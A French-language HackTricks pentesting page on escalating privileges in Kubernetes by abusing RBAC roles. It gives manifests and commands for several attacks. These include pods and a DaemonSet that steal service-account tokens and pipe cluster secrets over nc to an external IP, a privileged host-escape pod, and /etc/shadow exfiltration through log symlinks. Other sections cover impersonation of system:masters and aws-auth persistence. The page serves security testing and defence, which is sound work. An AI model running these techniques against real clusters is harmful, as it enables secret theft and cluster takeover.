# Abus des R√¥les/ClusterRoles dans Kubernetes

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Ici, vous pouvez trouver des configurations de R√¥les et ClusterRoles potentiellement dangereuses.\
N'oubliez pas que vous pouvez obtenir toutes les ressources prises en charge avec `kubectl api-resources`

## **√âl√©vation de privil√®ges**

En parlant de l'art d'obtenir **l'acc√®s √† un autre principal** au sein du cluster **avec des privil√®ges diff√©rents** (au sein du cluster Kubernetes ou aux clouds externes) que ceux que vous avez d√©j√†, dans Kubernetes, il existe essentiellement **4 techniques principales pour √©lever les privil√®ges** :

* Pouvoir **usurper l'identit√©** d'autres utilisateurs/groupes/SA avec des privil√®ges sup√©rieurs au sein du cluster Kubernetes ou aux clouds externes
* Pouvoir **cr√©er/patcher/ex√©cuter des pods** o√π vous pouvez **trouver ou attacher des SA** avec des privil√®ges sup√©rieurs au sein du cluster Kubernetes ou aux clouds externes
* Pouvoir **lire des secrets** car les tokens des SA sont stock√©s en tant que secrets
* Pouvoir **s'√©chapper vers le n≈ìud** √† partir d'un conteneur, o√π vous pouvez voler tous les secrets des conteneurs s'ex√©cutant dans le n≈ìud, les informations d'identification du n≈ìud et les autorisations du n≈ìud dans le cloud o√π il s'ex√©cute (le cas √©ch√©ant)
* Une cinqui√®me technique qui m√©rite d'√™tre mentionn√©e est la capacit√© √† **ex√©cuter un port-forward** dans un pod, car vous pouvez avoir acc√®s √† des ressources int√©ressantes dans ce pod.

### **Acc√©der √† n'importe quelle ressource ou verbe (Joker)**

Ce privil√®ge permet d'acc√©der √† **n'importe quelle ressource avec n'importe quel verbe**. Il s'agit du privil√®ge le plus important qu'un utilisateur puisse obtenir, surtout s'il s'agit d'un "ClusterRole". S'il s'agit d'un "ClusterRole", l'utilisateur peut acc√©der aux ressources de n'importe quel espace de noms et poss√©der le cluster avec cette permission.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### **Acc√©der √† n'importe quelle ressource**

Accorder √† un utilisateur la permission d'**acc√©der √† n'importe quelle ressource peut √™tre tr√®s risqu√©**. Mais, **quelles sont les actions** qui permettent d'acc√©der √† ces ressources ? Voici quelques autorisations RBAC dangereuses qui peuvent endommager l'ensemble du cluster :

* **resources: \["\*"] verbs: \["create"]** - Ce privil√®ge peut **cr√©er n'importe quelle ressource** dans le cluster, telle que des **pods**, des r√¥les, etc. Un attaquant pourrait l'exploiter pour **escalader les privil√®ges**. Un exemple de cela peut √™tre trouv√© dans la section **"Cr√©ation de pods"**.
* **resources: \["\*"] verbs: \["list"]** - La capacit√© de lister n'importe quelle ressource peut √™tre utilis√©e pour **d√©voiler les secrets d'autres utilisateurs** et faciliter ainsi l'**escalade des privil√®ges**. Un exemple de cela se trouve dans la section **"Liste des secrets"**.
* **resources: \["\*"] verbs: \["get"]** - Ce privil√®ge peut √™tre utilis√© pour **obtenir les secrets d'autres comptes de service**.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Cr√©ation de Pod - Vol de jeton

Un attaquant ayant l'autorisation de cr√©er un pod dans l'espace de noms "kube-system" peut cr√©er des conteneurs de cryptominage, par exemple. De plus, s'il existe un **compte de service avec des autorisations privil√©gi√©es, en ex√©cutant un pod avec ce service, les autorisations peuvent √™tre abus√©es pour escalader les privil√®ges**.

Ici, nous avons un compte privil√©gi√© par d√©faut nomm√© _bootstrap-signer_ avec des autorisations pour lister tous les secrets.

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

L'attaquant peut cr√©er un pod malveillant qui utilisera le service privil√©gi√©. Ensuite, en abusant du jeton de service, il pourra exfiltrer les secrets :

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
Dans l'image pr√©c√©dente, notez comment le service _bootstrap-signer est utilis√© dans_ `serviceAccountname`_._

Il suffit de cr√©er le pod malveillant et d'attendre les secrets sur le port 6666 :

### **Cr√©ation et √©vasion du pod**

La d√©finition suivante donne tous les privil√®ges qu'un conteneur peut avoir :

* **Acc√®s privil√©gi√©** (d√©sactivation des protections et configuration des capacit√©s)
* **D√©sactivation des espaces de noms hostIPC et hostPid** qui peuvent aider √† escalader les privil√®ges
* **D√©sactivation de l'espace de noms hostNetwork**, donnant acc√®s au vol des privil√®ges du cloud des n≈ìuds et un meilleur acc√®s aux r√©seaux
* **Montage de /hosts √† l'int√©rieur du conteneur**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Cr√©ez le pod avec:
```bash
kubectl --token $token create -f mount_root.yaml
```
Une ligne de [ce tweet](https://twitter.com/mauilion/status/1129468485480751104) avec quelques ajouts :
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Maintenant que vous pouvez √©chapper au n≈ìud, v√©rifiez les techniques de post-exploitation dans :

#### Furtivit√©

Vous voulez probablement √™tre **plus discret**, dans les pages suivantes, vous pouvez voir ce √† quoi vous pourriez acc√©der si vous cr√©ez un pod en activant uniquement certains des privil√®ges mentionn√©s dans le mod√®le pr√©c√©dent :

* **Privil√©gi√© + hostPID**
* **Privil√©gi√© uniquement**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Vous pouvez trouver des exemples de cr√©ation/abus des configurations de pods privil√©gi√©s pr√©c√©dentes sur_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Cr√©ation de pod - Passage au cloud

Si vous pouvez **cr√©er** un **pod** (et √©ventuellement un **compte de service**), vous pourriez √™tre en mesure d'**obtenir des privil√®ges dans l'environnement cloud** en **assignant des r√¥les cloud √† un pod ou √† un compte de service**, puis en y acc√©dant.\
De plus, si vous pouvez cr√©er un **pod avec l'espace de noms r√©seau h√¥te**, vous pouvez **voler le r√¥le IAM** de l'instance **n≈ìud**.

Pour plus d'informations, consultez :

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Cr√©er/Modifier le d√©ploiement, les Daemonsets, les Statefulsets, les Replicationcontrollers, les Replicasets, les Jobs et les Cronjobs**

Le d√©ploiement, les Daemonsets, les Statefulsets, les Replicationcontrollers, les Replicasets, les Jobs et les Cronjobs sont tous des privil√®ges qui permettent la cr√©ation de diff√©rentes t√¢ches dans le cluster. De plus, il est possible d'utiliser tous ces privil√®ges pour **d√©velopper des pods et m√™me cr√©er des pods**. Il est donc possible de les **abuser pour escalader les privil√®ges, tout comme dans l'exemple pr√©c√©dent**.

Supposons que nous ayons la **permission de cr√©er un Daemonset** et que nous cr√©ions le fichier YAML suivant. Ce fichier YAML est configur√© pour effectuer les m√™mes √©tapes que celles mentionn√©es dans la section "cr√©er des pods".
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
√Ä la ligne 6, vous pouvez trouver l'objet "spec" et des objets enfants tels que "**template**" √† la ligne 10. Ces objets contiennent la configuration de la t√¢che que nous souhaitons accomplir. Une autre chose √† remarquer est le "**serviceAccountName**" √† la ligne 15 et l'objet "**containers**" √† la ligne 18. C'est la partie qui concerne la cr√©ation de notre conteneur malveillant.

La documentation de l'API Kubernetes indique que le point de terminaison "**PodTemplateSpec**" permet de cr√©er des conteneurs. Et, comme vous pouvez le voir : **les d√©ploiements, les daemonsets, les statefulsets, les replicationcontrollers, les replicasets, les jobs et les cronjobs peuvent tous √™tre utilis√©s pour cr√©er des pods** :

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**Ainsi, le privil√®ge de cr√©er ou de mettre √† jour des t√¢ches peut √©galement √™tre utilis√© de mani√®re abusive pour une √©l√©vation de privil√®ges dans le cluster.**

### **Ex√©cution de Pods**

**`pods/exec`** est une ressource dans Kubernetes utilis√©e pour **ex√©cuter des commandes dans un shell √† l'int√©rieur d'un pod**. Ce privil√®ge est destin√© aux administrateurs qui souhaitent **acc√©der aux conteneurs et ex√©cuter des commandes**. C'est comme cr√©er une session SSH pour le conteneur.

Si nous avons ce privil√®ge, nous obtenons en r√©alit√© la capacit√© **de prendre le contr√¥le de tous les pods**. Pour ce faire, nous devons utiliser la commande suivante :
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
Notez que comme vous pouvez acc√©der √† n'importe quel pod, vous pouvez abuser du jeton d'autres pods, tout comme dans l'exploitation de la cr√©ation de pods, pour essayer d'escalader les privil√®ges.

### port-forward

Cette autorisation permet de **rediriger un port local vers un port sp√©cifi√© dans le pod**. Cela permet de d√©boguer facilement les applications s'ex√©cutant √† l'int√©rieur d'un pod, mais un attaquant pourrait l'exploiter pour acc√©der √† des applications int√©ressantes (comme des bases de donn√©es) ou vuln√©rables (des sites web ?) √† l'int√©rieur d'un pod :
```
kubectl port-forward pod/mypod 5000:5000
```
### **√âvasion de l'√©criture des h√¥tes /var/log/**

Comme [**indiqu√© dans cette recherche**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), si vous pouvez acc√©der ou cr√©er un pod avec le **montage du r√©pertoire `/var/log/` des h√¥tes**, vous pouvez **√©chapper du conteneur**.\
Cela est principalement d√ª au fait que lorsque le **Kube-API essaie d'obtenir les journaux** d'un conteneur (en utilisant `kubectl logs <pod>`), il **demande le fichier `0.log`** du pod en utilisant l'endpoint `/logs/` du service **Kubelet**.\
Le service Kubelet expose l'endpoint `/logs/` qui expose essentiellement le syst√®me de fichiers `/var/log` du conteneur.

Par cons√©quent, un attaquant ayant **acc√®s en √©criture au dossier /var/log/ du conteneur** pourrait exploiter ces comportements de deux mani√®res :

* Modifier le fichier `0.log` de son conteneur (g√©n√©ralement situ√© dans `/var/logs/pods/namespace_pod_uid/container/0.log`) pour qu'il soit un **lien symbolique pointant vers `/etc/shadow`** par exemple. Ensuite, vous pourrez exfiltrer le fichier shadow des h√¥tes en faisant :
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Si l'attaquant contr√¥le un principal avec les **permissions de lecture de `nodes/log`**, il peut simplement cr√©er un **lien symbolique** dans `/host-mounted/var/log/sym` vers `/` et lorsqu'il acc√®de √† `https://<gateway>:10250/logs/sym/`, il listera le syst√®me de fichiers racine de l'h√¥te (modifier le lien symbolique peut permettre d'acc√©der aux fichiers).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Un laboratoire et une exploitation automatis√©e peuvent √™tre trouv√©s dans** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Contournement de la protection en lecture seule <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Si vous avez la chance et que la capacit√© hautement privil√©gi√©e `CAP_SYS_ADMIN` est disponible, vous pouvez simplement remonter le dossier en lecture-√©criture :
```bash
mount -o rw,remount /hostlogs/
```
#### Contournement de la protection en lecture seule de hostPath <a href="#contournement-de-la-protection-en-lecture-seule-de-hostpath" id="contournement-de-la-protection-en-lecture-seule-de-hostpath"></a>

Comme indiqu√© dans [**cette recherche**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), il est possible de contourner la protection :
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ce qui √©tait cens√© emp√™cher les √©chappatoires comme les pr√©c√©dentes en utilisant, au lieu d'un montage hostPath, un PersistentVolume et un PersistentVolumeClaim pour monter un dossier d'h√¥tes dans le conteneur avec un acc√®s en √©criture:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonation de comptes privil√©gi√©s**

Avec un privil√®ge d'**[usurpation d'utilisateur](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)**, un attaquant peut se faire passer pour un compte privil√©gi√©.

Dans cet exemple, le compte de service _**sa-imper**_ a une liaison avec un ClusterRole avec des r√®gles qui lui permettent d'usurper des groupes et des utilisateurs.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

Il est possible de **listes tous les secrets** avec les attributs `--as=null --as-group=system:master` :

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**Il est √©galement possible d'effectuer la m√™me action via le point de terminaison API REST :**
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### **Listing Secrets**

Le **privil√®ge de lister les secrets** est une capacit√© puissante √† avoir dans le cluster. Un utilisateur ayant la permission de lister les secrets peut **potentiellement voir tous les secrets du cluster - y compris les cl√©s d'administration**. La cl√© secr√®te est un jeton JWT encod√© en base64.

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

Un attaquant qui obtient **l'acc√®s √† \_list secrets\_** dans le cluster peut utiliser les commandes _curl_ suivantes pour obtenir tous les secrets dans l'espace de noms "kube-system" :
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **Lecture d'un secret - force brute des identifiants de jetons**

Un attaquant qui a trouv√© un jeton avec la permission de lire un secret ne peut pas utiliser cette permission sans conna√Ætre le nom complet du secret. Cette permission est diff√©rente de la permission de _**listage**_ des _**secrets**_ d√©crite ci-dessus.

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

Bien que l'attaquant ne connaisse pas le nom du secret, il existe des comptes de service par d√©faut qui peuvent √™tre r√©pertori√©s.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

Chaque compte de service a un secret associ√© avec un pr√©fixe statique (non modifiable) et un postfixe d'un jeton de cha√Æne de cinq caract√®res al√©atoires √† la fin.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

La structure du jeton al√©atoire est une cha√Æne de 5 caract√®res construite √† partir de caract√®res alphanum√©riques (lettres minuscules et chiffres). **Mais elle ne contient pas toutes les lettres et tous les chiffres.**

En examinant le [code source](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83), il appara√Æt que le jeton est g√©n√©r√© √† partir de seulement 27 caract√®res "bcdfghjklmnpqrstvwxz2456789" et non pas 36 (a-z et 0-9).

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

Cela signifie qu'il y a 275 = 14 348 907 possibilit√©s pour un jeton.

Un attaquant peut lancer une attaque par force brute pour deviner l'identifiant du jeton en quelques heures. R√©ussir √† obtenir des secrets √† partir de comptes de service sensibles par d√©faut lui permettra d'escalader les privil√®ges.

### Demandes de signature de certificat

Si vous avez les verbes **`create`** dans la ressource `certificatesigningrequests` (ou au moins dans `certificatesigningrequests/nodeClient`), vous pouvez **cr√©er** une nouvelle demande de signature de certificat pour un **nouveau n≈ìud**.

Selon la [documentation, il est possible d'approuver automatiquement ces demandes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), donc dans ce cas, vous **n'avez pas besoin de permissions suppl√©mentaires**. Sinon, vous devriez √™tre en mesure d'approuver la demande, ce qui signifie mettre √† jour `certificatesigningrequests/approval` et `approve` dans `signers` avec le nom de ressource `<signerNameDomain>/<signerNamePath>` ou `<signerNameDomain>/*`.

Un **exemple de r√¥le** avec toutes les permissions requises est le suivant :
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Donc, avec le nouveau CSR du n≈ìud approuv√©, vous pouvez **abuser** des autorisations sp√©ciales des n≈ìuds pour **voler des secrets** et **escalader les privil√®ges**.

Dans [**cet article**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) et [**celui-ci**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), la configuration GKE K8s TLS Bootstrap est configur√©e avec une **signature automatique** et elle est utilis√©e de mani√®re abusive pour g√©n√©rer les informations d'identification d'un nouveau n≈ìud K8s, puis les utiliser pour escalader les privil√®ges en volant des secrets.\
Si vous **avez les privil√®ges mentionn√©s, vous pouvez faire la m√™me chose**. Notez que le premier exemple contourne l'erreur emp√™chant un nouveau n≈ìud d'acc√©der aux secrets √† l'int√©rieur des conteneurs, car un **n≈ìud ne peut acc√©der qu'aux secrets des conteneurs qui y sont mont√©s**.

La fa√ßon de contourner cela est simplement de **cr√©er des informations d'identification de n≈ìud pour le nom du n≈ìud o√π le conteneur contenant les secrets int√©ressants est mont√©** (mais v√©rifiez simplement comment le faire dans le premier article) :
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Les principaux qui peuvent modifier les **`configmaps`** dans l'espace de noms kube-system sur les clusters EKS (doivent √™tre dans AWS) peuvent obtenir les privil√®ges d'administrateur de cluster en √©crasant la configmap **aws-auth**.\
Les verbes n√©cessaires sont **`update`** et **`patch`**, ou **`create`** si la configmap n'a pas √©t√© cr√©√©e:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Vous pouvez utiliser **`aws-auth`** pour **la persistance** en donnant acc√®s aux utilisateurs d'**autres comptes**.

Cependant, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne fonctionne pas √† partir d'un compte diff√©rent**. Mais en r√©alit√©, `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` fonctionne si vous mettez l'ARN du cluster au lieu du nom.\
Pour que `kubectl` fonctionne, assurez-vous simplement de **configurer** le **kubeconfig de la victime** et dans les arguments aws exec, ajoutez `--profile other_account_role` afin que kubectl utilise le profil du compte des autres pour obtenir le jeton et contacter AWS.
{% endhint %}

### Escalade dans GKE

Il existe **2 fa√ßons d'attribuer des autorisations K8s aux principaux GCP**. Dans tous les cas, le principal a √©galement besoin de l'autorisation **`container.clusters.get`** pour pouvoir collecter les informations d'identification permettant d'acc√©der au cluster, sinon vous devrez **g√©n√©rer votre propre fichier de configuration kubectl** (suivez le lien suivant).

{% hint style="warning" %}
Lors de la communication avec le point de terminaison de l'API K8s, le **jeton d'authentification GCP sera envoy√©**. Ensuite, GCP, via le point de terminaison de l'API K8s, v√©rifiera d'abord si le principal (par e-mail) a un acc√®s quelconque √† l'int√©rieur du cluster, puis il v√©rifiera s'il a un acc√®s via GCP IAM.\
Si **l'un** de ces √©l√©ments est **vrai**, il sera **r√©pondu**. Sinon, une **erreur** sugg√©rant de donner des **autorisations via GCP IAM** sera donn√©e.
{% endhint %}

Ensuite, la premi√®re m√©thode consiste √† utiliser **GCP IAM**, les autorisations K8s ont leurs **√©quivalents d'autorisations GCP IAM**, et si le principal les a, il pourra les utiliser.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

La deuxi√®me m√©thode consiste √† **attribuer des autorisations K8s √† l'int√©rieur du cluster** en identifiant l'utilisateur par son **adresse e-mail** (y compris les comptes de service GCP).

### Cr√©er un jeton de serviceaccounts

Les principaux qui peuvent **cr√©er des TokenRequests** (`serviceaccounts/token`) peuvent √©mettre des jetons pour les SA √©quivalents √† un administrateur (informations provenant de [**ici**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Les principaux qui peuvent **`mettre √† jour`** ou **`modifier`** **`pods/ephemeralcontainers`** peuvent obtenir **l'ex√©cution de code sur d'autres pods**, et potentiellement **s'√©chapper** vers leur n≈ìud en ajoutant un conteneur √©ph√©m√®re avec un securityContext privil√©gi√©.

### ValidatingWebhookConfigurations ou MutatingWebhookConfigurations

Les principaux avec l'un des verbes `create`, `update` ou `patch` sur `validatingwebhookconfigurations` ou `mutatingwebhookconfigurations` pourraient √™tre en mesure de **cr√©er l'une de ces webhookconfigurations** afin de pouvoir **escalader les privil√®ges**.

Pour un exemple de [`mutatingwebhookconfigurations, consultez cette section de ce billet`](./#malicious-admission-controller).

### Escalade

Comme vous pouvez le lire dans la section suivante : [**Pr√©vention int√©gr√©e de l'escalade des privil√®ges**](./#built-in-privileged-escalation-prevention), un principal ne peut pas mettre √† jour ni cr√©er de r√¥les ou de clusterroles sans avoir lui-m√™me ces nouvelles autorisations. Sauf s'il a le **verbe `escalate`** sur **`roles`** ou **`clusterroles`.**\
Il peut alors mettre √† jour/cr√©er de nouveaux r√¥les, clusterroles avec des autorisations sup√©rieures √† celles qu'il poss√®de.

### Proxy des n≈ìuds

Les principaux ayant acc√®s √† la sous-ressource **`nodes/proxy`** peuvent **ex√©cuter du code sur des pods** via l'API Kubelet (selon [**ceci**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Plus d'informations sur l'authentification Kubelet sur cette page :

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Vous avez un exemple de comment obtenir [**RCE en parlant autoris√© √† une API Kubelet ici**](../pentesting-kubernetes-services.md#kubelet-rce).

### Supprimer des pods + n≈ìuds non planifiables

Les principaux qui peuvent **supprimer des pods** (verbe `delete` sur la ressource `pods`), ou **√©vacuer des pods** (verbe `create` sur la ressource `pods/eviction`), ou **modifier l'√©tat du pod** (acc√®s √† `pods/status`) et peuvent **rendre d'autres n≈ìuds non planifiables** (acc√®s √† `nodes/status`) ou **supprimer des n≈ìuds** (verbe `delete` sur la ressource `nodes`) et qui ont le contr√¥le sur un pod, pourraient **voler des pods √† d'autres n≈ìuds** afin qu'ils soient **ex√©cut√©s** dans le **n≈ìud compromis** et l'attaquant peut **voler les jetons** de ces pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### √âtat des services (CVE-2020-8554)

Les principaux qui peuvent **modifier** **`services/status`** peuvent d√©finir le champ `status.loadBalancer.ingress.ip` pour exploiter la **CVE-2020-8554 non corrig√©e** et lancer des attaques **MiTM contre le cluster**. La plupart des mesures d'att√©nuation pour la CVE-2020-8554 ne s'appliquent qu'aux services ExternalIP (selon [**ceci**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### √âtat des n≈ìuds et des pods

Les principaux ayant les autorisations **`update`** ou **`patch`** sur `nodes/status` ou `pods/status` peuvent modifier les √©tiquettes pour affecter les contraintes de planification appliqu√©es.

## Pr√©vention de l'escalade des privil√®ges int√©gr√©e

Bien qu'il puisse y avoir des autorisations risqu√©es, Kubernetes fait du bon travail pour pr√©venir d'autres types d'autorisations potentielles d'escalade des privil√®ges.

